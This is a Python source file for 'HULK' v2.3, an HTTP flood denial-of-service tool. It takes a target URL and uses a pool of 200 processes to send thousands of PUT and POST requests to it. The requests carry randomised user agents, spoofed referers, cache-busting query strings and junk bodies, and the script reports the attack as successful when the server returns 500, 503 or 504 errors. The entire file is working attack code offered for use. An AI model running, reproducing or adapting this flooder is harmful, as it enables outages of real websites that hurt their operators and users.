import requests               # Because it's faster and more powerful than urllib2
import sys
import threading
import random
import re
import time                   # For time.sleep
import multiprocessing
import ctypes

from multiprocessing import Pool
    
# Generates random ascii string of given size.
def buildblock(size):
    out_str = ''
    for i in range(size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str

# User Instructions
def usage():
    print('---------------------------------------------------')
    print('USAGE: python hulk.py <url>')
    print('Example: python hulk.py https://abcxyz123.com')
    print('---------------------------------------------------')

def init(ctr,sts,fg,flt):
    global counter,status,flag,fault
    counter = ctr
    status =sts
    flag = fg
    fault = flt

# Class vars

class Param_Class():

#Initialisation.
    def __init__(self):
        self.headers_useragents=[]
        self.headers_referers=[]
        self.dt = []
        self.urlc = sys.argv[1]
        if self.urlc.count("/")==2:
            self.urlc +=  "/"
            m = re.search('https\://([^/]*)/?.*', self.urlc)  
            self.host = m.group(1)
        else:
            self.host = ""

    def set_flag(self,val):
        flag.value=val
        
    def set_status(self,val):
        status[:]=val
        
    def inc_counter(self):
        counter.value+=1
        
    def inc_fault(self):
        fault.value+=1
        
    
# Generates a List of UserAgent headers.
    def useragent_list(self):
        self.headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
        self.headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
        self.headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
        self.headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
        self.headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
        return self.headers_useragents

# Generates a List of Referer headers.
    def referer_list(self):
        self.headers_referers.append('https://www.google.com/?q=')
        self.headers_referers.append('https://www.usatoday.com/search/results?q=')
        self.headers_referers.append('https://engadget.search.aol.com/search?q=')
        self.headers_referers.append('https://' + param_class.host + '/')
        return self.headers_referers

#Generates arbitrary data.
    def corrupt(self):
        for i in range(5000):
            self.dt.append(buildblock(random.randint(1,3)) + random.choice(['\a','\n','\t','\b','\r','\f']) + buildblock(random.randint(1,3)))
        
param_class = Param_Class()

# Main Function that sends a HTTPS request.
def attacker(num):
    param_class.useragent_list()
    param_class.referer_list()
    param_class.inc_counter()
    code=0
    urlc = param_class.urlc 
    if urlc.count("?")>0:          # For Quering type urls
        param_joiner="&"
    else:
        param_joiner="?"

    HeaderDict = {'User-Agent': random.choice(param_class.headers_useragents),'Cache-Control': 'no-cache','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','Referer': random.choice(param_class.headers_referers) + buildblock(random.randint(random.randint(0,5),random.randint(6,10))),'Keep-Alive': str(random.randint(110,120)),'Connection': 'keep-alive','Host':param_class.host}
    urlreq = urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10)))
    try:
        try:
            r = requests.put(url=urlreq,headers=HeaderDict,data=param_class.dt[num],timeout=(15,30))
        except:
            r = requests.post(url=urlreq,headers=HeaderDict,data=param_class.dt[num],timeout=(15,30))
        if (str(r.status_code)=='500') or (str(r.status_code)=='503') or (str(r.status_code)=='504'):
            param_class.set_flag(1)
            print('Successful.')
            code=500
        elif str(r.status_code)=='400':
            print('Url has DDoS protection.')
            sys.exit()
        elif str(r.status_code)=='404':
            print('Url does not exist.')
            sys.exit()
        elif str(r.status_code)=='429':
            print('Slowing down due to "Too many requests" error.',flush=True)
            time.sleep(20)
        elif str(r.status_code)=='405':
            r = requests.get(url=urlreq,headers=HeaderDict,timeout=(15,30))
        elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):       # For other unexpected HTTPS errors, prints the error code. 
            print(str(r.status_code))
        elif counter.value >= 5000:
            code = "Done"
        else:
            print('Sending crafted request: %s' % urlreq,flush=True)
                
    except Exception as e:
        print(str(e))
        param_class.inc_fault()
    return(code)        

# Handler for attacker. 
def handler(i):
    param_class.corrupt()
    if i<5000+fault.value:
        if flag.value<2:
            code = attacker(i)
            if code==500:
                param_class.set_flag(2)
                param_class.set_status("successly. ")
            print("%d Requests Sent" % counter.value,flush=True)

# Launcher. 
if __name__ == "__main__":  

    if len(sys.argv) < 2:
        usage()
        sys.exit()
    else:
        if sys.argv[1]=="help":
            usage()
            sys.exit()
        else:
            print("-- HULK Attack Started --")
            print("Current Version: 2.3")
            print("Compatible with: Python 3")
            print("Edited by: Hyperclaw79")

            counter = multiprocessing.Value('i',0)
            status = multiprocessing.Array(ctypes.c_wchar_p,' but failed.')
            flag = multiprocessing.Value('i',0)
            fault = multiprocessing.Value('i',0)
            p = Pool(processes=200,initializer=init, initargs=(counter,status,flag,fault))
            p.map_async(handler,range(5000+fault.value))
            p.close()
            p.join()
            print("\n-- HULK v2 Attack Finished %s--" % ''.join(status[:]))
